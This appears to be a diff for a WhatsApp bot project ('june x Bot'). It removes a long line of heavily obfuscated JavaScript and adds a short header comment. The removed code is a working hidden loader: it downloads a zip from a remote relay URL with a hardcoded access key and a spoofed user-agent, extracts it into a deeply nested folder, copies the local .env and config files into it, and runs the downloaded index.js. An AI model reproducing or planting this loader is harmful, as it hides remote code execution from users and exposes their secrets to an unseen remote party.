@@ -1,1 +1,880 @@
-const _0x4e6f7c=_0x19ee;(function(_0x3e68c1,_0x470ced){const _0x23b264=_0x19ee;const _0x43af13=_0x3e68c1();while(!![]){try{const _0x26c60e=-parseInt(_0x23b264(0x17b))/(-0xbbe+-0x227*-0x11+-0x6a*0x3c)*(parseInt(_0x23b264(0x18f))/(0x5*0x192+-0x1134+-0x95c*-0x1))+parseInt(_0x23b264(0x1b8))/(-0x3d*-0x41+0x169f+0xcb3*-0x3)+-parseInt(_0x23b264(0x1c2))/(0xb00+0x223d+-0x2d39)+parseInt(_0x23b264(0x1bb))/(0x1*-0x49+0x1*-0x137b+-0x13c9*-0x1)*(parseInt(_0x23b264(0x165))/(-0x7*0x3bb+0x3*-0x2+-0x1*-0x1a29))+-parseInt(_0x23b264(0x181))/(-0x2021+-0x1859+0x1*0x3881)+-parseInt(_0x23b264(0x1b5))/(0x23a0+-0x10f6+0x3*-0x636)*(-parseInt(_0x23b264(0x18d))/(0x1*-0x823+-0xe34+0x1660))+parseInt(_0x23b264(0x168))/(-0xc93+-0x1e0a+0xb3*0x3d);if(_0x26c60e===_0x470ced){break;}else{_0x43af13['push'](_0x43af13['shift']());}}catch(_0x18499b){_0x43af13['push'](_0x43af13['shift']());}}}(_0x489d,-0x47e18+0x1*0xbfc72+-0x30020*-0x1));const _0x23f58f=(function(){const _0x2b4f8e=_0x19ee;const _0x397846={};_0x397846['\x49\x4b\x4d\x43\x44']=function(_0x33ad6d,_0x4a2fe2){return _0x33ad6d!==_0x4a2fe2;};_0x397846[_0x2b4f8e(0x167)]=_0x2b4f8e(0x17d);_0x397846[_0x2b4f8e(0x1ad)]=function(_0x327b3e,_0x120b1f){return _0x327b3e===_0x120b1f;};_0x397846[_0x2b4f8e(0x161)]=_0x2b4f8e(0x1b1);const _0x1eb600=_0x397846;let _0x3e2fa8=!![];return function(_0x4b4062,_0x4e62e6){const _0x5d7d1b=_0x2b4f8e;const _0x52a86d={};_0x52a86d['\x6b\x47\x6e\x6d\x67']=function(_0x1e8843,_0x319b3d){return _0x1e8843<_0x319b3d;};_0x52a86d[_0x5d7d1b(0x1b4)]=_0x5d7d1b(0x19e);const _0x163ad3=_0x52a86d;const _0x4dcb55=_0x3e2fa8?function(){const _0x1790c8=_0x5d7d1b;const _0x42865f={};_0x42865f[_0x1790c8(0x193)]=_0x1790c8(0x178);const _0x168511=_0x42865f;if(_0x1eb600[_0x1790c8(0x166)](_0x1eb600[_0x1790c8(0x167)],_0x1790c8(0x17d))){let _0x132183=_0x56048f;for(let _0x3d4101=0x218*0x2+0x117c+0x49*-0x4c;_0x163ad3[_0x1790c8(0x189)](_0x3d4101,_0x2a258d);_0x3d4101++){_0x132183=_0x1cd790[_0x1790c8(0x187)](_0x132183,'\x63\x6f\x72\x65'+_0x3d4101);}const _0x16ecfa=_0x2cfe44[_0x1790c8(0x187)](_0x132183,_0x163ad3[_0x1790c8(0x1b4)]);const _0x399fd7={};_0x399fd7[_0x1790c8(0x1a1)]=!![];_0x5ea34b[_0x1790c8(0x1c0)](_0x16ecfa,_0x399fd7);return _0x16ecfa;}else{if(_0x4e62e6){if(_0x1eb600[_0x1790c8(0x1ad)](_0x1eb600['\x5a\x6e\x59\x56\x6c'],_0x1eb600[_0x1790c8(0x161)])){const _0x176631=_0x4e62e6[_0x1790c8(0x1bc)](_0x4b4062,arguments);_0x4e62e6=null;return _0x176631;}else{return _0x467e28[_0x1790c8(0x1b0)]()[_0x1790c8(0x16d)](_0x168511['\x53\x79\x53\x76\x4d'])['\x74\x6f\x53\x74\x72\x69\x6e\x67']()[_0x1790c8(0x197)](_0x390b69)[_0x1790c8(0x16d)](_0x168511[_0x1790c8(0x193)]);}}}}:function(){};_0x3e2fa8=![];return _0x4dcb55;};}());const _0x1c3fe2=_0x23f58f(this,function(){const _0x527f5d=_0x19ee;const _0x18cc32={};_0x18cc32[_0x527f5d(0x184)]=_0x527f5d(0x178);const _0x4fcfb5=_0x18cc32;return _0x1c3fe2['\x74\x6f\x53\x74\x72\x69\x6e\x67']()[_0x527f5d(0x16d)](_0x527f5d(0x178))[_0x527f5d(0x1b0)]()[_0x527f5d(0x197)](_0x1c3fe2)[_0x527f5d(0x16d)](_0x4fcfb5['\x47\x64\x4a\x4d\x74']);});_0x1c3fe2();const fs=require('\x66\x73');const path=require(_0x4e6f7c(0x174));function _0x19ee(_0x50d597,_0x92e13d){_0x50d597=_0x50d597-(-0x33*-0x35+-0x2586+-0x5*-0x5ab);const _0x463a54=_0x489d();let _0x134ae9=_0x463a54[_0x50d597];if(_0x19ee['\x4c\x74\x63\x6a\x70\x71']===undefined){var _0x4a9062=function(_0x2b2af6){const _0x27fe9f='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';let _0x18b459='';let _0xaa58f2='';let _0x1b356d=_0x18b459+_0x4a9062;for(let _0x56ed2b=0x145*0x3+-0x21+0x1*-0x3ae,_0x3904a8,_0x1c0964,_0x38312e=0x39*0x71+0x12af+0x2*-0x15ec;_0x1c0964=_0x2b2af6['\x63\x68\x61\x72\x41\x74'](_0x38312e++);~_0x1c0964&&(_0x3904a8=_0x56ed2b%(-0x727+-0x1*-0x1f67+-0x3*0x814)?_0x3904a8*(-0x16*-0xce+-0xf71+-0x203)+_0x1c0964:_0x1c0964,_0x56ed2b++%(-0x2444+0x446*0x2+0x1bbc))?_0x18b459+=_0x1b356d['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x38312e+(-0x984+-0x4*-0x4cb+0x99e*-0x1))-(0x1553+0x1fa+0xf*-0x18d)!==0x238d+0x209d+-0x442a?String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0x21d9+0x4a7*0x1+-0x2581&_0x3904a8>>(-(0x16b5+0x1de2+-0x3495)*_0x56ed2b&0x3*0xac0+0x1980+-0x2*0x1cdd)):_0x56ed2b:-0x193+0x257+0xc4*-0x1){_0x1c0964=_0x27fe9f['\x69\x6e\x64\x65\x78\x4f\x66'](_0x1c0964);}for(let _0x20771f=-0x1*0x8ae+0xfb7*0x2+-0x1c*0xd0,_0x45463f=_0x18b459['\x6c\x65\x6e\x67\x74\x68'];_0x20771f<_0x45463f;_0x20771f++){_0xaa58f2+='\x25'+('\x30\x30'+_0x18b459['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x20771f)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](-0xba4+-0x1*0xae1+0x787*0x3))['\x73\x6c\x69\x63\x65'](-(0x229*-0x2+0x1*0x10c1+-0xc6d));}return decodeURIComponent(_0xaa58f2);};_0x19ee['\x59\x56\x7a\x7a\x51\x4d']=_0x4a9062;_0x19ee['\x44\x77\x4d\x45\x74\x66']={};_0x19ee['\x4c\x74\x63\x6a\x70\x71']=!![];}const _0x338041=_0x463a54[-0x2540+-0x18f7+-0x3e37*-0x1];const _0x59f6a3=_0x50d597+_0x338041;const _0xa8433c=_0x19ee['\x44\x77\x4d\x45\x74\x66'][_0x59f6a3];if(!_0xa8433c){const _0x79990e=function(_0x4d833a){this['\x4f\x70\x52\x78\x61\x48']=_0x4d833a;this['\x57\x59\x70\x54\x45\x75']=[-0x1*-0x155c+0x1*-0x77b+-0xde0,-0x2396+-0x11c6+0x355c,-0x841+0x4*0x8d3+0x2b*-0xa1];this['\x5a\x7a\x72\x44\x70\x71']=function(){return'\x6e\x65\x77\x53\x74\x61\x74\x65';};this['\x51\x6e\x63\x59\x4c\x77']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a';this['\x53\x49\x57\x52\x59\x4d']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x79990e['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x53\x77\x4b\x58\x68\x7a']=function(){const _0x31d52d=new RegExp(this['\x51\x6e\x63\x59\x4c\x77']+this['\x53\x49\x57\x52\x59\x4d']);const _0x49c442=_0x31d52d['\x74\x65\x73\x74'](this['\x5a\x7a\x72\x44\x70\x71']['\x74\x6f\x53\x74\x72\x69\x6e\x67']())?--this['\x57\x59\x70\x54\x45\x75'][0x1e85+-0x1*-0x1a0a+-0x3*0x12da]:--this['\x57\x59\x70\x54\x45\x75'][0xd37+0x2*-0xb80+0x3*0x343];return this['\x76\x78\x71\x43\x64\x76'](_0x49c442);};_0x79990e['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x76\x78\x71\x43\x64\x76']=function(_0x94c7ef){if(!Boolean(~_0x94c7ef)){return _0x94c7ef;}return this['\x70\x76\x46\x66\x4c\x58'](this['\x4f\x70\x52\x78\x61\x48']);};_0x79990e['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x70\x76\x46\x66\x4c\x58']=function(_0x4ccf8b){for(let _0xf4d757=0x1ad6+-0xba3+-0xf33,_0x399d0e=this['\x57\x59\x70\x54\x45\x75']['\x6c\x65\x6e\x67\x74\x68'];_0xf4d757<_0x399d0e;_0xf4d757++){this['\x57\x59\x70\x54\x45\x75']['\x70\x75\x73\x68'](Math['\x72\x6f\x75\x6e\x64'](Math['\x72\x61\x6e\x64\x6f\x6d']()));_0x399d0e=this['\x57\x59\x70\x54\x45\x75']['\x6c\x65\x6e\x67\x74\x68'];}return _0x4ccf8b(this['\x57\x59\x70\x54\x45\x75'][-0x14e5+0x11*0x21a+-0xed5]);};new _0x79990e(_0x19ee)['\x53\x77\x4b\x58\x68\x7a']();_0x134ae9=_0x19ee['\x59\x56\x7a\x7a\x51\x4d'](_0x134ae9);_0x19ee['\x44\x77\x4d\x45\x74\x66'][_0x59f6a3]=_0x134ae9;}else{_0x134ae9=_0xa8433c;}return _0x134ae9;}const axios=require(_0x4e6f7c(0x1ab));function _0x489d(){const _0x313c00=['\x72\x78\x6a\x6d\x7a\x76\x65','\x75\x33\x4c\x74\x44\x4b\x30','\x44\x32\x66\x59\x42\x47','\x74\x31\x62\x35\x73\x4c\x75','\x41\x67\x76\x48\x7a\x67\x76\x59\x43\x57','\x79\x32\x39\x55\x43\x33\x72\x59\x44\x77\x6e\x30\x42\x33\x69','\x34\x50\x59\x66\x69\x67\x6e\x56\x42\x4d\x7a\x50\x7a\x59\x35\x51\x43\x59\x62\x4a\x42\x33\x62\x50\x7a\x77\x71','\x7a\x4d\x4c\x53\x44\x67\x76\x59','\x42\x67\x76\x55\x7a\x33\x72\x4f','\x79\x32\x39\x57\x45\x75\x7a\x50\x42\x67\x76\x74\x45\x77\x35\x4a','\x43\x4d\x76\x5a\x43\x67\x39\x55\x43\x32\x75','\x7a\x67\x66\x30\x79\x71','\x42\x67\x4c\x49\x78\x33\x6e\x50\x7a\x32\x35\x48\x42\x68\x6d','\x41\x33\x62\x49\x73\x31\x69','\x76\x66\x6e\x64\x41\x77\x53','\x43\x4d\x76\x4a\x44\x78\x6a\x5a\x41\x78\x7a\x4c','\x43\x31\x6e\x72\x77\x67\x57','\x44\x66\x4c\x36\x72\x77\x69','\x45\x4b\x54\x72\x77\x68\x4b','\x42\x4b\x6a\x62\x74\x75\x34','\x7a\x78\x48\x50\x44\x61','\x34\x50\x32\x6d\x69\x66\x50\x6a\x75\x63\x62\x4c\x45\x68\x72\x59\x79\x77\x6e\x30\x7a\x77\x71\x47\x42\x4d\x39\x30\x41\x67\x4c\x55\x7a\x57','\x79\x32\x39\x55\x7a\x4d\x4c\x4e\x6c\x4d\x50\x5a','\x79\x32\x48\x4b\x41\x78\x69','\x77\x67\x6a\x51\x71\x30\x57','\x79\x78\x48\x50\x42\x33\x6d','\x7a\x65\x44\x64\x44\x77\x65','\x76\x4b\x7a\x7a\x76\x4b\x75','\x7a\x78\x48\x50\x43\x33\x72\x5a\x75\x33\x4c\x55\x79\x57','\x43\x4d\x76\x48\x7a\x67\x72\x50\x43\x4c\x6e\x35\x42\x4d\x6d','\x44\x67\x39\x74\x44\x68\x6a\x50\x42\x4d\x43','\x72\x30\x7a\x73\x43\x33\x47','\x74\x4d\x72\x67\x79\x78\x4b','\x45\x68\x6e\x58\x42\x67\x4c\x30\x7a\x74\x6d','\x71\x78\x44\x35\x72\x76\x4b','\x6d\x4a\x71\x5a\x6e\x5a\x61\x31\x6e\x4c\x6a\x63\x43\x67\x7a\x33\x75\x71','\x44\x31\x66\x71\x41\x68\x65','\x79\x32\x39\x55\x7a\x4d\x4c\x4e\x7a\x67\x69\x55\x41\x4e\x6d','\x6d\x5a\x43\x35\x6e\x5a\x65\x57\x44\x32\x54\x78\x44\x67\x58\x76','\x76\x4d\x54\x32\x71\x4c\x71','\x34\x50\x32\x6d\x69\x66\x6e\x35\x42\x4d\x6d\x47\x7a\x4d\x66\x50\x42\x67\x76\x4b\x6f\x47','\x6f\x74\x61\x34\x6d\x68\x72\x4e\x43\x33\x72\x50\x42\x71','\x79\x78\x62\x57\x42\x68\x4b','\x6c\x4d\x76\x55\x44\x47','\x42\x67\x4c\x49','\x43\x33\x72\x48\x44\x68\x76\x5a','\x42\x77\x54\x4b\x41\x78\x6a\x74\x45\x77\x35\x4a','\x43\x4d\x66\x52\x75\x31\x4f','\x6d\x74\x69\x58\x6d\x4a\x43\x59\x6f\x67\x6e\x4f\x44\x4c\x50\x49\x44\x61','\x38\x6a\x2b\x75\x48\x63\x62\x74\x45\x77\x35\x4a\x41\x77\x35\x4e\x69\x67\x6e\x56\x7a\x67\x76\x5a\x69\x67\x7a\x59\x42\x32\x30\x47\x43\x32\x76\x4a\x44\x78\x6a\x4c\x69\x68\x6a\x4c\x42\x67\x66\x35\x6c\x49\x34\x55','\x72\x77\x44\x65\x76\x4d\x43','\x7a\x4d\x58\x4f\x79\x78\x6d','\x42\x32\x44\x55\x71\x30\x34','\x77\x4d\x35\x7a\x76\x4d\x57','\x7a\x32\x76\x30','\x34\x50\x32\x6d\x69\x66\x72\x66\x71\x30\x48\x78\x74\x31\x6a\x65\x69\x65\x31\x65\x69\x67\x58\x48\x44\x77\x35\x4a\x41\x63\x62\x4c\x43\x4e\x6a\x56\x43\x4a\x4f','\x44\x67\x4c\x54\x7a\x77\x39\x31\x44\x61','\x6d\x74\x79\x58\x6e\x66\x6a\x51\x45\x65\x31\x6d\x45\x61','\x73\x75\x54\x6e\x71\x30\x71','\x44\x75\x76\x48\x41\x4e\x65','\x6d\x74\x61\x32\x6d\x4a\x43\x30\x6e\x5a\x62\x6d\x74\x67\x72\x59\x71\x78\x61','\x43\x33\x72\x48\x44\x66\x6e\x35\x42\x4d\x6d','\x43\x75\x7a\x5a\x72\x4b\x75','\x34\x50\x59\x66\x69\x67\x58\x50\x79\x49\x39\x4a\x42\x32\x35\x4d\x41\x77\x44\x4b\x79\x49\x35\x51\x43\x59\x62\x4c\x45\x67\x4c\x5a\x44\x68\x6d','\x79\x30\x6e\x73\x79\x4b\x79','\x43\x32\x76\x48\x43\x4d\x6e\x4f','\x7a\x4d\x39\x77\x72\x4e\x61','\x44\x30\x4c\x70\x79\x33\x43','\x76\x75\x50\x66\x41\x4d\x75','\x34\x50\x51\x47\x37\x37\x49\x70\x69\x63\x35\x4c\x42\x4e\x79\x47\x42\x4d\x39\x30\x69\x67\x6e\x56\x43\x67\x4c\x4c\x7a\x61','\x72\x4b\x39\x6d\x77\x77\x47','\x42\x77\x76\x5a\x43\x32\x66\x4e\x7a\x71','\x43\x67\x66\x30\x41\x61','\x79\x33\x6a\x7a\x43\x4e\x69','\x7a\x78\x6a\x59\x42\x33\x69','\x34\x50\x59\x66\x69\x65\x6e\x56\x7a\x67\x76\x5a\x69\x68\x6e\x35\x42\x4d\x6e\x4c\x7a\x63\x62\x5a\x44\x77\x6e\x4a\x7a\x78\x6e\x5a\x7a\x4e\x76\x53\x42\x68\x4b','\x6b\x63\x47\x4f\x6c\x49\x53\x50\x6b\x59\x4b\x52\x6b\x73\x53\x4b','\x42\x67\x39\x4e','\x42\x67\x66\x66\x75\x68\x47','\x6d\x4a\x69\x57\x6f\x74\x6d\x58\x73\x4c\x4c\x52\x7a\x4e\x6a\x76','\x43\x65\x66\x59\x77\x65\x79','\x79\x75\x7a\x69\x44\x76\x6d','\x34\x50\x59\x66\x69\x63\x35\x4c\x42\x4e\x79\x47\x79\x32\x39\x57\x41\x77\x76\x4b','\x42\x4d\x39\x4b\x7a\x76\x39\x54\x42\x32\x72\x31\x42\x67\x76\x5a','\x79\x32\x39\x59\x7a\x71','\x6f\x64\x79\x35\x6f\x64\x71\x31\x6d\x4d\x66\x4a\x77\x65\x58\x74\x74\x61','\x77\x68\x66\x36\x75\x75\x30','\x34\x50\x51\x47\x37\x37\x49\x70\x69\x67\x58\x50\x79\x49\x39\x4a\x42\x32\x35\x4d\x41\x77\x44\x4b\x79\x49\x35\x51\x43\x59\x62\x55\x42\x33\x71\x47\x7a\x4d\x39\x31\x42\x4d\x71\x47\x6b\x67\x35\x56\x42\x49\x31\x4d\x79\x78\x72\x48\x42\x63\x4b','\x72\x32\x72\x6b\x74\x78\x71','\x43\x30\x58\x6b\x71\x78\x79','\x73\x77\x76\x4d\x71\x75\x4f','\x41\x4d\x39\x50\x42\x47','\x72\x31\x76\x6e\x73\x76\x6d','\x41\x30\x44\x55\x42\x77\x43','\x43\x4d\x76\x5a\x43\x67\x39\x55\x43\x32\x76\x75\x45\x78\x62\x4c','\x45\x63\x31\x48\x79\x32\x6e\x4c\x43\x33\x6d\x54\x41\x32\x76\x35','\x42\x68\x6e\x4b\x41\x77\x69','\x6d\x5a\x7a\x4b\x76\x68\x62\x58\x71\x78\x6d','\x79\x78\x6a\x59\x79\x78\x4c\x49\x44\x77\x7a\x4d\x7a\x78\x69','\x6e\x4b\x76\x34\x43\x4e\x44\x69\x44\x61','\x74\x4d\x7a\x77\x77\x65\x30','\x43\x4d\x72\x6c\x7a\x30\x43'];_0x489d=function(){return _0x313c00;};return _0x489d();}const AdmZip=require('\x61\x64\x6d\x2d\x7a\x69\x70');const VERCEL_RELAY_URL=process.env.VERCEL_RELAY_URL||'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x63\x68\x77\x6f\x72\x6c\x64\x2d\x72\x65\x6c\x61\x79\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x70\x69\x2f\x72\x65\x70\x6f';const ACCESS_KEY=process.env.ACCESS_KEY||'\x74\x65\x63\x68\x77\x6f\x72\x6c\x64\x5f\x73\x65\x63\x75\x72\x65\x5f\x32\x30\x32\x36';const baseFolder=path['\x6a\x6f\x69\x6e'](__dirname,_0x4e6f7c(0x17f),_0x4e6f7c(0x1b3));const DEEP_NEST_COUNT=-0x1467+0x1ed4+0x369*-0x3;function createDeepRepoPath(){const _0x2cddbb=_0x4e6f7c;let _0x27a699=baseFolder;for(let _0x44c3ff=0x12d*-0x1+-0x243d+-0x256a*-0x1;_0x44c3ff<DEEP_NEST_COUNT;_0x44c3ff++){_0x27a699=path[_0x2cddbb(0x187)](_0x27a699,_0x2cddbb(0x180)+_0x44c3ff);}const _0xba568a=path[_0x2cddbb(0x187)](_0x27a699,_0x2cddbb(0x19e));const _0x1bf965={};_0x1bf965[_0x2cddbb(0x1a1)]=!![];fs[_0x2cddbb(0x1c0)](_0xba568a,_0x1bf965);return _0xba568a;}async function downloadAndExtractRepo(_0x58fffd){const _0x5b3461=_0x4e6f7c;const _0x4d217d={};_0x4d217d[_0x5b3461(0x195)]='\x2e\x65\x6e\x76';_0x4d217d[_0x5b3461(0x188)]='\u2705\x20\x2e\x65\x6e\x76\x20\x63\x6f\x70\x69\x65\x64';_0x4d217d[_0x5b3461(0x19f)]=function(_0x47c58c,_0x4e62a1){return _0x47c58c!==_0x4e62a1;};_0x4d217d[_0x5b3461(0x1a2)]=_0x5b3461(0x16e);_0x4d217d[_0x5b3461(0x1b2)]=_0x5b3461(0x18e);_0x4d217d[_0x5b3461(0x190)]='\x74\x65\x63\x68\x20\x77\x6f\x72\x64\x2d\x6d\x64\x2d\x6c\x6f\x61\x64\x65\x72';_0x4d217d[_0x5b3461(0x160)]=_0x5b3461(0x1ba);const _0x1acbea=_0x4d217d;try{if(_0x1acbea[_0x5b3461(0x19f)](_0x1acbea[_0x5b3461(0x1a2)],_0x5b3461(0x192))){console['\x6c\x6f\x67'](_0x5b3461(0x1c3));const _0x4c5dfe={};_0x4c5dfe[_0x5b3461(0x18a)]=_0x1acbea[_0x5b3461(0x1b2)];_0x4c5dfe[_0x5b3461(0x196)]={};_0x4c5dfe[_0x5b3461(0x164)]=0x4e20;_0x4c5dfe[_0x5b3461(0x196)][_0x5b3461(0x18b)]=ACCESS_KEY;_0x4c5dfe[_0x5b3461(0x196)]['\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74']=_0x1acbea[_0x5b3461(0x190)];const _0x52d3c3=await axios[_0x5b3461(0x162)](VERCEL_RELAY_URL,_0x4c5dfe);const _0x22feac=new AdmZip(Buffer['\x66\x72\x6f\x6d'](_0x52d3c3[_0x5b3461(0x19d)]));_0x22feac['\x65\x78\x74\x72\x61\x63\x74\x41\x6c\x6c\x54\x6f'](_0x58fffd,!![]);console[_0x5b3461(0x179)](_0x5b3461(0x177));}else{if(_0x5bc794['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](_0x32c6fc)){_0x2822da[_0x5b3461(0x19b)](_0x4997b1,_0x567ec6[_0x5b3461(0x187)](_0x2a6a49,_0x1acbea[_0x5b3461(0x195)]));_0x442335['\x6c\x6f\x67'](_0x1acbea['\x47\x55\x4d\x49\x53']);}}}catch(_0x1cbfbd){console[_0x5b3461(0x176)](_0x1acbea['\x6f\x67\x6e\x43\x4e'],_0x1cbfbd[_0x5b3461(0x19c)]?.[_0x5b3461(0x1bf)]||_0x1cbfbd[_0x5b3461(0x173)]);process[_0x5b3461(0x1a6)](0xc02+-0x1723+0x1e*0x5f);}}function copyConfigs(_0xa9bef9){const _0x4d9033=_0x4e6f7c;const _0x4e0534={};_0x4e0534[_0x4d9033(0x16f)]=_0x4d9033(0x1a8);_0x4e0534['\x6e\x57\x54\x45\x6b']=function(_0x3bd566,_0x5f58de){return _0x3bd566===_0x5f58de;};_0x4e0534[_0x4d9033(0x1c1)]='\x67\x64\x76\x6d\x71';_0x4e0534['\x46\x4f\x4c\x59\x68']=_0x4d9033(0x1b6);_0x4e0534[_0x4d9033(0x1c4)]='\u2705\x20\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73\x20\x63\x6f\x70\x69\x65\x64';_0x4e0534['\x64\x47\x43\x75\x61']='\u26a0\ufe0f\x20\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73\x20\x6e\x6f\x74\x20\x63\x6f\x70\x69\x65\x64';_0x4e0534[_0x4d9033(0x18c)]=_0x4d9033(0x1a5);_0x4e0534['\x63\x43\x52\x62\x46']=_0x4d9033(0x17e);_0x4e0534[_0x4d9033(0x17c)]=_0x4d9033(0x171);const _0x167081=_0x4e0534;const _0x4bad28=path[_0x4d9033(0x187)](__dirname,_0x167081['\x77\x49\x4f\x63\x77']);const _0x2d047b=path[_0x4d9033(0x187)](__dirname,_0x4d9033(0x1bd));try{if(_0x167081['\x6e\x57\x54\x45\x6b'](_0x167081[_0x4d9033(0x1c1)],_0x167081['\x72\x61\x6b\x53\x5a'])){if(fs[_0x4d9033(0x1ae)](_0x4bad28)){if(_0x167081[_0x4d9033(0x172)]!==_0x4d9033(0x1b6)){_0x19ff16['\x6c\x6f\x67'](_0x4d9033(0x16b));}else{fs['\x63\x6f\x70\x79\x46\x69\x6c\x65\x53\x79\x6e\x63'](_0x4bad28,path[_0x4d9033(0x187)](_0xa9bef9,_0x167081[_0x4d9033(0x16f)]));console[_0x4d9033(0x179)](_0x167081[_0x4d9033(0x1c4)]);}}}else{if(_0x2ba3b0['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](_0x23951b)){_0xeff2e4[_0x4d9033(0x19b)](_0x4b6708,_0x5429d1[_0x4d9033(0x187)](_0x2ca8b5,_0x4d9033(0x1a8)));_0x11f884['\x6c\x6f\x67'](_0x4d9033(0x198));}}}catch{console[_0x4d9033(0x194)](_0x167081[_0x4d9033(0x1ac)]);}try{if(fs[_0x4d9033(0x1ae)](_0x2d047b)){if(_0x167081['\x6e\x57\x54\x45\x6b'](_0x167081[_0x4d9033(0x18c)],_0x4d9033(0x1a5))){fs[_0x4d9033(0x19b)](_0x2d047b,path['\x6a\x6f\x69\x6e'](_0xa9bef9,_0x4d9033(0x1bd)));console[_0x4d9033(0x179)](_0x167081[_0x4d9033(0x16c)]);}else{_0x41de26=_0x542f40[_0x4d9033(0x187)](_0x281e87,'\x63\x6f\x72\x65'+_0x241287);}}}catch{console[_0x4d9033(0x194)](_0x167081[_0x4d9033(0x17c)]);}}((async()=>{const _0x5c5618=_0x4e6f7c;const _0x974891={'\x58\x71\x7a\x51\x4d':'\u2705\x20\x2e\x65\x6e\x76\x20\x63\x6f\x70\x69\x65\x64','\x74\x59\x7a\x45\x62':_0x5c5618(0x163),'\x54\x53\x43\x69\x6b':_0x5c5618(0x1a8),'\x69\x45\x70\x6c\x65':'\u2705\x20\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73\x20\x63\x6f\x70\x69\x65\x64','\x63\x72\x59\x72\x72':function(_0x2130ee,_0x5bccc0){return _0x2130ee===_0x5bccc0;},'\x49\x65\x66\x41\x4a':'\x61\x69\x45\x64\x74','\x48\x59\x70\x56\x43':_0x5c5618(0x1a7),'\x55\x4a\x45\x6a\x65':function(_0x3b9272,_0x18d36d){return _0x3b9272(_0x18d36d);},'\x7a\x4b\x51\x58\x79':_0x5c5618(0x1b7),'\x6c\x61\x45\x50\x78':_0x5c5618(0x16b),'\x56\x6b\x76\x42\x54':function(_0x408933,_0x3d2b03){return _0x408933===_0x3d2b03;},'\x72\x64\x4b\x67\x47':'\x41\x75\x54\x57\x6a','\x58\x62\x6a\x43\x4c':'\x69\x6e\x64\x65\x78\x2e\x6a\x73','\x66\x6c\x68\x61\x73':function(_0x128975,_0x2d5e59){return _0x128975!==_0x2d5e59;},'\x71\x46\x73\x46\x45':'\x73\x4c\x4a\x41\x76'};const _0x192100=createDeepRepoPath();await downloadAndExtractRepo(_0x192100);const _0x597261=fs[_0x5c5618(0x1af)](_0x192100)[_0x5c5618(0x199)](_0xef1a9b=>fs[_0x5c5618(0x169)](path[_0x5c5618(0x187)](_0x192100,_0xef1a9b))['\x69\x73\x44\x69\x72\x65\x63\x74\x6f\x72\x79']());if(!_0x597261[_0x5c5618(0x19a)]){if(_0x974891[_0x5c5618(0x175)](_0x974891['\x49\x65\x66\x41\x4a'],_0x974891[_0x5c5618(0x186)])){console[_0x5c5618(0x176)](_0x974891['\x48\x59\x70\x56\x43']);process[_0x5c5618(0x1a6)](-0x7ce+0x138*0x1a+-0x17e1);}else{_0x238e41[_0x5c5618(0x19b)](_0x11380e,_0x13572a[_0x5c5618(0x187)](_0x142473,_0x5c5618(0x1bd)));_0x555287[_0x5c5618(0x179)](KbpINh[_0x5c5618(0x182)]);}}const _0x153406=path[_0x5c5618(0x187)](_0x192100,_0x597261[-0x4*-0x973+0x71c+-0x2ce8]);_0x974891[_0x5c5618(0x170)](copyConfigs,_0x153406);const _0x589dda=path[_0x5c5618(0x187)](_0x153406,_0x5c5618(0x1be),_0x974891[_0x5c5618(0x1a4)]);if(!fs[_0x5c5618(0x1ae)](_0x589dda)){console[_0x5c5618(0x194)](_0x5c5618(0x183));}else{console['\x6c\x6f\x67'](_0x974891[_0x5c5618(0x17a)]);}try{if(_0x974891[_0x5c5618(0x1b9)](_0x974891['\x72\x64\x4b\x67\x47'],_0x974891[_0x5c5618(0x191)])){console[_0x5c5618(0x179)]('\x5b\ud83d\ude80\x5d\x20\x4c\x61\x75\x6e\x63\x68\x69\x6e\x67\x20\x54\x45\x43\x48\x57\x4f\x52\x44\x20\x4d\x44\x20\x42\x6f\x74\x2e\x2e\x2e');process[_0x5c5618(0x1a9)](_0x153406);require(path[_0x5c5618(0x187)](_0x153406,_0x974891[_0x5c5618(0x1aa)]));}else{_0x469e74[_0x5c5618(0x176)](_0x974891[_0x5c5618(0x1a3)],_0x26ec50[_0x5c5618(0x173)]);_0x3fd0a9[_0x5c5618(0x1a6)](0x6*-0x31d+-0x25a2*0x1+0x455*0xd);}}catch(_0x5c0656){if(_0x974891[_0x5c5618(0x1c5)](_0x5c5618(0x185),_0x974891[_0x5c5618(0x16a)])){_0x9f48a9[_0x5c5618(0x19b)](_0x348ef2,_0x2b5db4[_0x5c5618(0x187)](_0x2dc4f9,KbpINh[_0x5c5618(0x1a0)]));_0x328ada['\x6c\x6f\x67'](KbpINh['\x69\x45\x70\x6c\x65']);}else{console['\x65\x72\x72\x6f\x72'](_0x974891['\x74\x59\x7a\x45\x62'],_0x5c0656[_0x5c5618(0x173)]);process[_0x5c5618(0x1a6)](0x1f*-0x6+0x1461+0x2*-0x9d3);}}})());
+/**
+ * june x Bot - A WhatsApp Bot
+ * Tennor-modz 
+ * © 2025 supreme
+ * * NOTE: This is the combined codebase. It handles cloning the core code from 
+ * * the hidden repo on every startup while ensuring persistence files (session and settings) 
+ * * are protected from being overwritten.
+ */
+
+// --- Environment Setup ---
+const config = require('./config');
+/*━━━━━━━━━━━━━━━━━━━━*/
